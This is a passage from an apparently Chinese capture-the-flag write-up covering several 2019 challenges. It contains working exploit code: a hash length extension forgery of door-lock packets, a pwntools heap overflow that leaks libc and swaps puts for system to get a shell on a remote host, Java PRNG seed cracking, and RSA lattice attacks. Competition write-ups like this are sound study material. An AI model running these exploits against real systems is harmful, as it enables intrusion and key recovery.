    print('rand:', rand, int.from_bytes(rand, 'big'))

    # 对1版本的数据包做hash长度扩展攻击，篡改门锁时间
    # 2601c8f0ec78f53927540fb72fb8475eab29fe451add68851ad0bc3b6c21050c9bc85ccbdad110
    # 已有的padding能提供64-16-5-1=42字节的内容，剩下的需要追加128-34=94字节的padding
    attack = hashpumpy.hashpump('C8F0EC78F53927540FB72FB8475EAB29FE451ADD68851AD0BC3B6C21050C9BC8',
                                bytes.fromhex('5ccbdad110'), b'\x00'*(128-42)+b'\x04'+rand, 16)
    # attack = hashpumpy.hashpump(known[1:33], known[33:], b'\x00' * 94 + b'\x04' + rand, 16)
    print(attack)
    sign = attack[0]

    packet = b'\x02' + bytes.fromhex(attack[0]) + attack[1]
    print(packet)
    ret = tester.send_curl(packet)

    # # 开门数据包，修改版本号后原样发送即可
    # #280170c896bb5aa844f848cdee8c0542bf438d3c8aa7e43bd09ce4e4351db000e7ff5ccbdad22001f0
    ret = tester.send_curl(bytes.fromhex('0270c896bb5aa844f848cdee8c0542bf438d3c8aa7e43bd09ce4e4351db000e7ff5ccbdad22001f0'))
    print("ret:", ret)

if __name__ == '__main__':
    main()
```

运行后即可得到flag

![](https://cy-pic.kuaizhan.com/g3/0f/57/1682-f0d1-45a2-8908-b0ef81f95fc725)


## MISC
### 签到

![IMG_256](https://cy-pic.kuaizhan.com/g3/23/0a/56a8-60c3-485d-a3d2-c516de98b47915)

### 鲲or鳗orGame
两首歌（鸡你太美，大碗宽面还挺好听），一个游戏

题目说选一个，二首歌一个游戏，那先选游戏把

想把游戏直接通关，但是网页好像不太好操作

看看游戏页面源码

![](https://cy-pic.kuaizhan.com/g3/ce/11/2fef-5b1d-4aa5-83ef-4a17b0c56b3a47)

试试能不能直接看js目录，是可以的，搜索有用信息

mobile.js里看到

![](https://cy-pic.kuaizhan.com/g3/0f/a5/443b-7b6b-4609-ba75-7516ae62862525)

game.gb（附件）应该就是游戏了，下载下来，百度搜了一下是GAMEBOY文件

下了个模拟器运行游戏，然后百度都会有说金手指，模拟器

![](https://cy-pic.kuaizhan.com/g3/87/47/ab12-a748-4818-bfaa-10e2a9085a6647)

查查就是个修改器之类的，但这个模拟器里的不太会用，想着改数值，但这里好像只能插入，换了一个

开始游戏（手残，基本只能过1个，所以卡了试了很久）

每次结束开金手指搜几次通过的个数

第一次：过一个

![](https://cy-pic.kuaizhan.com/g3/81/65/2a82-b5e0-4ae8-8202-5610bc4a324e51)

第二次：过两个

![](https://cy-pic.kuaizhan.com/g3/3b/44/617a-5839-46ed-8fff-2455beb2005f33)

那就把两个地址的数值改到最大 FF

分别应用两个金手指，发现第一个，在开始到结束，结束的时候，就出了flag，但是一会就没了，还好手速快
 
![](https://cy-pic.kuaizhan.com/g3/44/23/4053-9117-4483-b482-613868ef248e96)

## Crypto
### 强网先锋-辅助

由题意可知两个n有共同的素数，用辗转相除法求出这个素数p，在用n//p得到q即可根据rsa解密公式求出明文：

![](https://cy-pic.kuaizhan.com/g3/37/fa/5bb9-42b5-4a5b-a50a-b73705cd083394)

![](https://cy-pic.kuaizhan.com/g3/54/d1/e10c-29f4-467b-ad5d-5cf203b6131375)

![](https://cy-pic.kuaizhan.com/g3/d0/bd/c496-b11d-47e5-ae2d-8482b36162b733)

### Copperstudy

Level0:

8字节的sha256，其中前五位已经知道，通过pwntools获得参数，爆破即可：

![](https://cy-pic.kuaizhan.com/g3/f7/1b/ed47-216b-4ea1-8db6-2f8f8aa37b2373)

Level1：

已知明文的前440位，后72位未知，用coppersmith算法得出m：

![](https://cy-pic.kuaizhan.com/g3/b6/77/811d-b12c-4c7a-bf15-2c364930800456)

M=90e1660dea565f39b970f85df641533cf27d868152c6e2580d116eefac0a08ee044f8d25b9542cc26ca4def66d40b8a3e1ad912e048470dcbc528a2865a3bfef

Level2:

不知道p的后128位，仍然用coppersmith算法求出q：

![](https://cy-pic.kuaizhan.com/g3/89/73/afb8-7af8-44b3-879f-08df3d16862389)

q=6604581748402653764201738484426147360096389094695544270124843986940937624534827121574193693349752286015841451817154565775829453708372553379990639392956781

然后n/q求出p，用rsa解密公式解密。

得到

m=218f49a4661f76005a17b92b5af29b648435c428d7548a8837a65c24ad6bfb8b556b065cd9d6d168c0cd2a5b36de0bc1f61298617bb370ebcab3f33d0d4c89bc

Level3：

只知道d的后512位，还是用coppersmith算法求出q：

![](https://cy-pic.kuaizhan.com/g3/e2/3e/5507-e47a-4af0-82f1-10dff2f5389a29)

![](https://cy-pic.kuaizhan.com/g3/8a/47/2fc3-8961-4306-83fa-1853dc34cd9c28)

求出素数

q=11000650274751522370142078921978482877845511625699897790227407836720327411411182898531046988532756381187615879588960624645920464690947671950438982430030411

然后求出p和d，在根据rsa解密公式得到

M=bde78b37be9f24a23e33e966a0888aa9e32aeaa6c88b20b0b064a328207455cc53cc1ac68482f7249fb07739e514d240c7a509fe9b4fce901e0657086746fc50

Level4：

明显的广播攻击：

![](https://cy-pic.kuaizhan.com/g3/02/bc/bd8b-0c1a-4cf7-8972-4e7ed83f0eb283)

得到

M=c7dd93310ab23d76f670ae70b1d2b5558311c72a2ef78891d63f389c78a4914aa8697e43ef8b36295ef6ce2370b2a2eae6a11d2a5afb7dd3ebceeb15f39a4e29

Level5：

低加密指数。

c1-c2+k\*n=3m\^2+3m+1

m\^2+m=(c1-c2+k\*n-1)/3

4\*m\^2+4\*m+1=4/3\*(c1-c2+k\*n-1)+1

爆破k使得4/3\*(c1-c2+k\*n-1)+1为平方数，然后根据k求出m：

![](https://cy-pic.kuaizhan.com/g3/b9/77/5fed-3b8a-4927-a41f-69bfe054810023)

M=5747544acdf2b4c25b0dd659a48f1fb06748d92b7832e792a843653a4a04860c0d27d68af4c6ec338537a50b73b8295b1d9f9014434e0da6b62e258354a8b588

Level6:

高加密指数，但d稍大，不能使用wiener攻击，在这里使用boneh_durfee攻击：

```
import time

############################################
# Config
##########################################

"""
Setting debug to true will display more informations
about the lattice, the bounds, the vectors...
"""
debug = True

"""
Setting strict to true will stop the algorithm (and
return (-1, -1)) if we don't have a correct 
upperbound on the determinant. Note that this 
doesn't necesseraly mean that no solutions 
will be found since the theoretical upperbound is
usualy far away from actual results. That is why
you should probably use `strict = False`
"""
strict = False

"""
This is experimental, but has provided remarkable results
so far. It tries to reduce the lattice as much as it can
while keeping its efficiency. I see no reason not to use
this option, but if things don't work, you should try
disabling it
"""
helpful_only = True
dimension_min = 7 # stop removing if lattice reaches that dimension

############################################
# Functions
##########################################

# display stats on helpful vectors
def helpful_vectors(BB, modulus):
    nothelpful = 0
    for ii in range(BB.dimensions()[0]):
        if BB[ii,ii] >= modulus:
            nothelpful += 1

    print nothelpful, "/", BB.dimensions()[0], " vectors are not helpful"

# display matrix picture with 0 and X
def matrix_overview(BB, bound):
    for ii in range(BB.dimensions()[0]):
        a = ('%02d ' % ii)
        for jj in range(BB.dimensions()[1]):
            a += '0' if BB[ii,jj] == 0 else 'X'
            if BB.dimensions()[0] < 60:
                a += ' '
        if BB[ii, ii] >= bound:
            a += '~'
        print a

# tries to remove unhelpful vectors
# we start at current = n-1 (last vector)
def remove_unhelpful(BB, monomials, bound, current):
    # end of our recursive function
    if current == -1 or BB.dimensions()[0] <= dimension_min:
        return BB

    # we start by checking from the end
    for ii in range(current, -1, -1):
        # if it is unhelpful:
        if BB[ii, ii] >= bound:
            affected_vectors = 0
            affected_vector_index = 0
            # let's check if it affects other vectors
            for jj in range(ii + 1, BB.dimensions()[0]):
                # if another vector is affected:
                # we increase the count
                if BB[jj, ii] != 0:
                    affected_vectors += 1
                    affected_vector_index = jj

            # level:0
            # if no other vectors end up affected
            # we remove it
            if affected_vectors == 0:
                print "* removing unhelpful vector", ii
                BB = BB.delete_columns([ii])
                BB = BB.delete_rows([ii])
                monomials.pop(ii)
                BB = remove_unhelpful(BB, monomials, bound, ii-1)
                return BB

            # level:1
            # if just one was affected we check
            # if it is affecting someone else
            elif affected_vectors == 1:
                affected_deeper = True
                for kk in range(affected_vector_index + 1, BB.dimensions()[0]):
                    # if it is affecting even one vector
                    # we give up on this one
                    if BB[kk, affected_vector_index] != 0:
                        affected_deeper = False
                # remove both it if no other vector was affected and
                # this helpful vector is not helpful enough
                # compared to our unhelpful one
                if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) < abs(bound - BB[ii, ii]):
                    print "* removing unhelpful vectors", ii, "and", affected_vector_index
                    BB = BB.delete_columns([affected_vector_index, ii])
                    BB = BB.delete_rows([affected_vector_index, ii])
                    monomials.pop(affected_vector_index)
                    monomials.pop(ii)
                    BB = remove_unhelpful(BB, monomials, bound, ii-1)
                    return BB
    # nothing happened
    return BB

""" 
Returns:
* 0,0   if it fails
* -1,-1 if `strict=true`, and determinant doesn't bound
* x0,y0 the solutions of `pol`
"""
def boneh_durfee(pol, modulus, mm, tt, XX, YY):
    """
    Boneh and Durfee revisited by Herrmann and May
    
    finds a solution if:
    * d < N^delta
    * |x| < e^delta
    * |y| < e^0.5
    whenever delta < 1 - sqrt(2)/2 ~ 0.292
    """

    # substitution (Herrman and May)
    PR.<u, x, y> = PolynomialRing(ZZ)
    Q = PR.quotient(x*y + 1 - u) # u = xy + 1
    polZ = Q(pol).lift()

    UU = XX*YY + 1

    # x-shifts
    gg = []
    for kk in range(mm + 1):
        for ii in range(mm - kk + 1):
            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk
            gg.append(xshift)
    gg.sort()

    # x-shifts list of monomials
    monomials = []
    for polynomial in gg:
        for monomial in polynomial.monomials():
            if monomial not in monomials:
                monomials.append(monomial)
    monomials.sort()
    
    # y-shifts (selected by Herrman and May)
    for jj in range(1, tt + 1):
        for kk in range(floor(mm/tt) * jj, mm + 1):
            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)
            yshift = Q(yshift).lift()
            gg.append(yshift) # substitution
    
    # y-shifts list of monomials
    for jj in range(1, tt + 1):
        for kk in range(floor(mm/tt) * jj, mm + 1):
            monomials.append(u^kk * y^jj)

    # construct lattice B
    nn = len(monomials)
    BB = Matrix(ZZ, nn)
    for ii in range(nn):
        BB[ii, 0] = gg[ii](0, 0, 0)
        for jj in range(1, ii + 1):
            if monomials[jj] in gg[ii].monomials():
                BB[ii, jj] = gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)

    # Prototype to reduce the lattice
    if helpful_only:
        # automatically remove
        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-1)
        # reset dimension
        nn = BB.dimensions()[0]
        if nn == 0:
            print "failure"
            return 0,0

    # check if vectors are helpful
    if debug:
        helpful_vectors(BB, modulus^mm)
    
    # check if determinant is correctly bounded
    det = BB.det()
    bound = modulus^(mm*nn)
    if det >= bound:
        print "We do not have det < bound. Solutions might not be found."
        print "Try with highers m and t."
        if debug:
            diff = (log(det) - log(bound)) / log(2)
            print "size det(L) - size e^(m*n) = ", floor(diff)
        if strict:
            return -1, -1
    else:
        print "det(L) < e^(m*n) (good! If a solution exists < N^delta, it will be found)"

    # display the lattice basis
    if debug:
        matrix_overview(BB, modulus^mm)

    # LLL
    if debug:
        print "optimizing basis of the lattice via LLL, this can take a long time"

    BB = BB.LLL()

    if debug:
        print "LLL is done!"

    # transform vector i & j -> polynomials 1 & 2
    if debug:
        print "looking for independent vectors in the lattice"
    found_polynomials = False
    
    for pol1_idx in range(nn - 1):
        for pol2_idx in range(pol1_idx + 1, nn):
            # for i and j, create the two polynomials
            PR.<w,z> = PolynomialRing(ZZ)
            pol1 = pol2 = 0
            for jj in range(nn):
                pol1 += monomials[jj](w*z+1,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)
                pol2 += monomials[jj](w*z+1,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)

            # resultant
            PR.<q> = PolynomialRing(ZZ)
            rr = pol1.resultant(pol2)

            # are these good polynomials?
            if rr.is_zero() or rr.monomials() == [1]:
                continue
            else:
                print "found them, using vectors", pol1_idx, "and", pol2_idx
                found_polynomials = True
                break
        if found_polynomials:
            break

    if not found_polynomials:
        print "no independant vectors could be found. This should very rarely happen..."
        return 0, 0
    
    rr = rr(q, q)

    # solutions
    soly = rr.roots()

    if len(soly) == 0:
        print "Your prediction (delta) is too small"
        return 0, 0

    soly = soly[0][0]
    ss = pol1(q, soly)
    solx = ss.roots()[0][0]

    #
    return solx, soly

def example():
    ############################################
    # How To Use This Script
    ##########################################

    #
    # The problem to solve (edit the following values)
    #

    # the modulus
    N = 0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27
    
    # the public exponent
    e = 0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bb

    # the hypothesis on the private exponent (the theoretical maximum is 0.292)
    delta = .18 # this means that d < N^delta

    #
    # Lattice (tweak those values)
    #

    # you should tweak this (after a first run), (e.g. increment it until a solution is found)
    m = 4 # size of the lattice (bigger the better/slower)

    # you need to be a lattice master to tweak these
    t = int((1-2*delta) * m)  # optimization from Herrmann and May
    X = 2*floor(N^delta)  # this _might_ be too much
    Y = floor(N^(1/2))    # correct if p, q are ~ same size

    #
    # Don't touch anything below
    #

    # Problem put in equation
    P.<x,y> = PolynomialRing(ZZ)
    A = int((N+1)/2)
    pol = 1 + x * (A + y)

    #
    # Find the solutions!
    #

    # Checking bounds
    if debug:
        print "=== checking values ==="
        print "* delta:", delta
        print "* delta < 0.292", delta < 0.292
        print "* size of e:", int(log(e)/log(2))
        print "* size of N:", int(log(N)/log(2))
        print "* m:", m, ", t:", t

    # boneh_durfee
    if debug:
        print "=== running algorithm ==="
        start_time = time.time()

    solx, soly = boneh_durfee(pol, e, m, t, X, Y)

    # found a solution?
    if solx > 0:
        print "=== solution found ==="
        if False:
            print "x:", solx
            print "y:", soly

        d = int(pol(solx, soly) / e)
        print "private key found:", d
    else:
        print "=== no solution was found ==="

    if debug:
        print("=== %s seconds ===" % (time.time() - start_time))

if __name__ == "__main__":
example()
```

得到

d=776765455081795377117377680209510234887230129318575063382634593357724998207571

求出

M=6b3bb0cdc72a7f2ce89902e19db0fb2c0514c76874b2ca4113b86e6dc128d44cc859283db4ca8b0b5d9ee35032aec8cc8bb96e8c11547915fc9ef05aa2d72b28

综上，得到flag:

![](https://cy-pic.kuaizhan.com/g3/c2/04/1259-c4e6-4870-baa6-6f1f7707046175)

### 其他
移步：https://altman.vip/2019/05/27/QWB2019-writeup/

## Pwn
### 强网先锋-AP


思路很清晰，在change处，可以溢出。

![](https://cy-pic.kuaizhan.com/g3/82/31/fb62-21b7-42be-b1ee-f17f62aec5d627)

所有可以通过溢出泄露heap和putslibc地址，然后将putsaddr 换成
systemaddr，在堆块里用 /bin/sh，在show时getshgell，cat flag 如下

![](https://cy-pic.kuaizhan.com/g3/10/3d/0e30-fceb-4b93-8236-e5b3b0c668fb19)

exp如下:

```
from pwn import *
context.log_level = "debug"
context.os = "linux"
context.arch = "amd64"

# p = process("./task_main")
p = remote('117.78.60.139',30014)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def add(lenth,name):
    p.recvuntil('Choice >> \n')
    p.sendline('1')
    p.recvuntil("The length of my owner's name:\n")
    p.sendline(str(lenth))
    p.recvuntil("Give me my owner's name:\n")
    p.send(name)

def show(index):
    p.recvuntil('Choice >> \n')
    p.sendline('2')
    p.recvuntil('Please tell me which tickets would you want to open?\n')
    p.sendline(str(index))
    p.recvuntil("I'm a magic tickets.I will tell you who is my owner!\n")

def edit(index,length,name):
    p.recvuntil('Choice >> \n')
    p.sendline('3')
    p.recvuntil("Please tell me which tickets would you want to change it's owner's name?\n")
    p.sendline(str(index))
    p.recvuntil("The length of my owner's name:\n")
    p.sendline(str(length))
    p.recvuntil("Give me my owner's name:\n")
    p.send(name)

# gdb.attach(p)
add(0x80,"a"*0x7f)
add(0x80,'/bin/sh\x00'.ljust(0x7f,'a'))
edit(0,0x80+0x10+1,'a'*0x90)
show(0)
p.recvuntil('a'*0x90)
heap = p.recvuntil('\n')[:-1]
print heap
heap = u64(heap.ljust(8,'\x00'))
edit(0,0x80+0x18+1,'a'*0x98)
show(0)
p.recvuntil('a'*0x98)
putsaddr = u64(p.recv(6).ljust(8,'\x00'))
libcaddr = putsaddr - libc.symbols['puts']
print "**********"
print hex(heap)
print hex(libcaddr)
payload = 'a'*0x80 + p64(0) + p64(0x21) + p64(heap) + p64(libcaddr + libc.symbols['system'])
edit(0,0x80+0x20+1,payload)
show(1)

p.interactive()
```

### randomstudy

可以看见题目的意思是破解三个随机函数。

Level0:之后很多题目都有的爆破sha256，一共随机的8个字符，总长为16位的十六进制，在移位运算下已知10位，6位未知，则通过爆破法比对sha256进行确认，大约1分钟能得到正确的字符串。提交队伍token。

Level1：利用的是python的random函数，但这里随机数种子用的是服务器端的时间的int数值，多次（一次）尝试将本机时间校准到服务器端即可生成正确的随机数。

Level3:由于上面已经设定了正确的随机数种子，直接生成随机数即可

Level2:本题大头，利用的是java的java.util.random的nextint函数。正常爆破是不存在的，在谷歌上一番搜索发现了有人crack了这个函数。

![](https://cy-pic.kuaizhan.com/g3/9a/c0/dbe5-cb0c-4234-b884-8d721e590fd371)

可以通过两个随机数得到生成第一个随机数的种子，由此通过第一个种子往下递推得到生成的第三个随机数。

上述脚本如下：
```
import hashlib
from xf import *
from pwn import *
import time
import random
import subprocess

def level0(known,ans):
    dic="0123456789abcdef"
    li=[]
    new_li=str_len_split(known,2)
    ch=""
    for i in new_li:
        ch+=chr(int(i,16))

    for i in dic:
        for j in dic:
            li.append(i+j)

    for i in li:
        for j in li:
            for k in li:
                tmp=ch+chr(int(i,16))+chr(int(j,16))+chr(int(k,16))
                if (hashlib.sha256(tmp).hexdigest()==ans):
                    return (known+i+j+k)

def level1(v1,v2):
    o = subprocess.check_output(["java", "exp", v1, v2])
    tmp=o.split("\n")
    print tmp
    if ("unable" in tmp[0]):
        return str(1) 
    return str(int(tmp[1]))

p = remote("119.3.245.36",23456)
token = "f587119614fea533d9eb877abd0c1235"
p.recvuntil("hexdigest()=",drop=True)
ans=p.recvuntil("\n").replace("\n","")
p.recvuntil("skr[0:5].encode('hex')=",drop=True)
known=p.recvuntil("\n").replace("\n","")
p.sendlineafter("skr.encode('hex')=",level0(known,ans))
p.sendlineafter("teamtoken:",token)
print("level 0 finish")
random.seed(int(time.time()))
p.sendlineafter("[-]",str(random.randint(0,2**64)))
print p.recvline()

while(True):
    # print ("again")
    p.recvuntil('[-]',drop=True)
    ans_v1=p.recvuntil("\n").replace("\n","")
    p.recvuntil('[-]',drop=True)
    ans_v2=p.recvuntil("\n").replace("\n","")
    print("v1:"+ans_v1)
    print("v2:"+ans_v2)
    p.sendlineafter("[-]",level1(ans_v1,ans_v2))
    a=p.recv()
    print (a+"!")
    if ("failed" not in a):
        break

p.sendlineafter("[-]",str(random.getrandbits(32)))
print p.recv()

```
java脚本，exp.class
```
import java.util.Random;

public class exp 
{
	public static void main(String[] args) {
//		Random random = new Random();
//		long v1 = 1821104762L;
//		long v2 = 1701777056L;
//		long v3 = 1058631697L;
		long v1 = Long.parseLong(args[0]);
		long v2 = Long.parseLong(args[1]);
		long multiplier = 0x5DEECE66DL;
		long mask = (1L << 48) - 1;
		long addend = 11L;{
		for (int i = 0; i < 65536; i++) 
		{	
		    long seed = v1 * 65536 + i;
		    if (((seed * multiplier + addend) & mask) >>> 16== v2) {
		        System.out.println("Seed found: " + seed);
		        long nextseed = (((seed* multiplier)+addend)& mask);
		        System.out.println((((nextseed* multiplier)+addend)& mask) >>> 16);
		        break;
		    }
		    if (i==65535){
		    	System.out.println("unable to find seed");
		    }
		}
}}}
```

得到flag

![QQ20190525-203240\@2x.png](https://cy-pic.kuaizhan.com/g3/bc/94/dae6-672f-4f8f-a44e-af0e1e9d6b0651)

## RE

### 强网先锋_AD

Ida打开看到程序逻辑只有一个加密函数，

![IMG_256](https://cy-pic.kuaizhan.com/g3/0a/67/afc7-de9b-4ad6-bb17-442d3383270a65)

跟进后发现只是简单的base64加密，

![IMG_256](https://cy-pic.kuaizhan.com/g3/e6/27/9499-ee68-4259-b4dd-ac2b7b9d731e12)

将密文提出来后解密一下就行

![](https://p.pstatp.com/origin/fe2d0000a1e8c19b6e8d)

Flag:

`flag{mafakuailaiqiandaob}`

# 评论区
**请文明评论，禁止广告**
<img src="https://cloud.panjunwen.com/alu/扇耳光.png" alt="扇耳光.png" class="vemoticon-img">  

---